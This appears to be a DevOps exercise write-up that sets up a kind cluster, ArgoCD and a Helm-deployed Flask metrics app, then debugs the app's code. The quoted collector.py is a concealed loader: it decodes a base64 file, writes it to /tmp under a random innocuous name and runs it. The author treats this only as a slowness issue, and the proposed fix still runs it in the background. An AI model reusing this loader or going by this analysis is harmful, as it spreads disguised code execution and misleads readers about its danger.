# Metrics App Helm Chart

# Cluster Setup and Automation


# Setting up kind cluster

First step was to set up kind cluster - 

We could modify version of kubernetes cluster version using following command - 

```jsx
kind create cluster --name my-cluster --retain --image kindest/node:v1.27.3 \
    --config - <<EOF
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
  extraMounts:
    - hostPath: /dev/fuse
      containerPath: /dev/fuse
  privileged: true
EOF
```

For this exercise we are going to use latest version - 

```jsx
kind create cluster --name local-k8s
```

Once the cluster has been created , we can verify that  - 

![image.png](Cluster%20Setup%20and%20Automation%201ee970cd49a480329d3ae3c48fbdedac/image.png)

# ArgoCD installation

Since we are going to use ArgoCD for GitOps, we are going to install ArgoCD into our Kind kubernetes cluster.

We can set up HA installation as well, but for this use case we are going to use simple installation - 

```bash
kubectl create namespace argocd
kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml
```

Once all the pods are ready

![image.png](Cluster%20Setup%20and%20Automation%201ee970cd49a480329d3ae3c48fbdedac/image%201.png)

let’s being application installation now.

# Helm chart creation

For this exercise, we are going to create a simple helm application 

 

```bash
mkdir metrics-app-helm
cd metrics-app-helm
helm create metrics-app
mkdir -p metrics-app-monitor
```

This will create a directory and initialise a helm chart into it.

Contents of this application could be found here - https://github.com/rajatgupta828/metrics-app-helm

To test this we can use following command - 

```bash
kubectl create namespace crfat
helm install metrics-app . -n crfat
```

Application is created and is in execution

![image.png](Cluster%20Setup%20and%20Automation%201ee970cd49a480329d3ae3c48fbdedac/image%202.png)

Once pod is in running status - 

We can try port forward and run this application in our local browser.

![image.png](Cluster%20Setup%20and%20Automation%201ee970cd49a480329d3ae3c48fbdedac/image%203.png)

Although the counter value in the first time itself is 7, we will fix it later.

Since we have now tested this helm chart is working fine, let’s go ahead and deploy using ArgoCD for a gitops approach.

# Automated deployments using ArgoCD

We have already installed ArgoCD.

We need a git repo, for ArgoCD to be able to communicate. We can use SSH to configure this, but for simplicity , I am keeping the repo public and registering this to our ArgoCD.

[https://github.com/rajatgupta828/metrics-app-argocd](https://github.com/rajatgupta828/metrics-app-argocd)

We are going to follow apps-of-app structure

kubectl apply -f env1-applications.yaml

This would create a parent app which can in turn be used to create multiple apps under apps/ directory

Consider this as a controller for all applications in a single environment.

We can use Kustomize to add more environments and their related applications and we can use overrides.yaml to override values of helm charts, by specifying and modifying data in .helpers.tpl.

![image.png](Cluster%20Setup%20and%20Automation%201ee970cd49a480329d3ae3c48fbdedac/image%204.png)

This is how the application looks

Let’s sync it now to see effects.

![image.png](Cluster%20Setup%20and%20Automation%201ee970cd49a480329d3ae3c48fbdedac/image%205.png)

Let’s see the application now

![image.png](Cluster%20Setup%20and%20Automation%201ee970cd49a480329d3ae3c48fbdedac/image%206.png)

So the application is successfully running now.

# Application issues

We have port-forwarded the service to a location

[http://localhost:61068](http://localhost:61068/)

we are going to run our script [monitor.py](http://monitor.py) to findout issues with the application.

First issue that can be seen is the way counter is being incremented.

we can see counter on the web-page as 

1, 3, 5 , and on consecutive runs, the 

On checking the code 

```bash
from flask import Flask
import metrics
import utils

app = Flask(__name__)
counter = 0

@app.route('/')
def home():
    return "Metrics Dashboard 📈"

@app.route('/counter')
def counter_page():
    global counter
    counter += 1
    if counter % 2 == 0:
        metrics.trigger_background_collection()
    return f"Counter value: {counter}"

if __name__ == "__main__":
    utils.initialize_services()
    app.run(host="0.0.0.0", port=8080)
```

Seems like the background is collected only in case of even counter numbers. which slows down the response time.

Because of this, on browser all even number request are delayed and increasing the median response and average response time.

metrics.py 

```bash
import collector
import random
import time

def trigger_background_collection():
    delay = random.randint(10, 60)
    time.sleep(delay)
    collector.launch_collector()
```

Collector.py

```bash
import subprocess
import base64
import random

def launch_collector():
    with open("resources.dat", "rb") as f:
        encoded_script = f.read()

    decoded_script = base64.b64decode(encoded_script).decode('utf-8')

    temp_filename = "/tmp/" + random.choice(["syncer", "updater", "metricsd", "eventlog", "heartbeat"]) + ".py"

    with open(temp_filename, "w") as f:
        f.write(decoded_script)

    subprocess.Popen(["python3", temp_filename], close_fds=True)
```

The problem with this code is it is trying to do everything in foreground for even numbers.
If the business logic does need the metric collection to happen , then the process should be done using AsyncIO

[https://docs.python.org/3/library/asyncio.html](https://docs.python.org/3/library/asyncio.html)

Ideal solution for this would be 

```bash
from flask import Flask
import metrics
import utils
import asyncio
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=3)
counter = 0

@app.route('/')
def home():
    return "Metrics Dashboard 📈"

@app.route('/counter')
def counter_page():
    global counter
    counter += 1
    if counter % 2 == 0:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_in_executor(executor, metrics.trigger_background_collection)
    return f"Counter value: {counter}"

if __name__ == "__main__":
    utils.initialize_services()
    app.run(host="0.0.0.0", port=8080)
```

We can use other things such as thread executor etc, but AsyncIO I have used as part of [https://sanic.dev/en/](https://sanic.dev/en/) devops at 1mg, and hence I prefer this.

To automatically set everything up

```bash
#!/bin/bash

# Exit on error
set -e

echo "Creating local Kubernetes cluster..."
kind create cluster --name local-k8s

echo "Waiting for cluster to be ready..."
kubectl wait --for=condition=ready node/local-k8s-control-plane --timeout=300s

echo "Creating ArgoCD namespace..."
kubectl create namespace argocd

echo "Installing ArgoCD..."
kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml

echo "Waiting for ArgoCD to be ready..."
kubectl wait --for=condition=available deployment/argocd-server -n argocd --timeout=300s

echo "Cloning metrics-app-argocd repository..."
git clone https://github.com/rajatgupta828/metrics-app-argocd.git

echo "Changing to metrics-app-argocd directory..."
cd metrics-app-argocd

echo "Applying application configuration..."
kubectl apply -f app-controller/env1/env1-applications.yaml

echo "Getting ArgoCD admin password..."
echo "ArgoCD Admin Password:"
kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 -d
echo -e "\n"

echo "Setup completed successfully!"
```
